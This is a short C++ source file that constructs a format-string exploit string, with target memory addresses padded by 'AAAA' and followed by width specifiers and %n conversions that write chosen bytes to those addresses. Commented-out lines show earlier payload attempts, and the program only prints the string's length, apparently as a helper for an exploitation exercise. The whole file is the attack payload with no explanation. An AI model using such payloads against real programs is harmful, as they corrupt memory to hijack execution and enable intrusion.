#include <iostream>
#include <string>

int main ()
{
 //  char *temp="\xa0\xfc\xff\xff.%3x.%n";
//  char *temp="\x90";
char *temp="\x0c\xfb\xff\xffAAAA"
              "\x0d\xfb\xff\xffAAAA"
              "\x0e\xfb\xff\xffAAAA"
              "\x0f\xfb\xff\xff"
              "%112x%n%139x%3x%n%192x%n"; 
 std::cout<<strlen(temp);
}
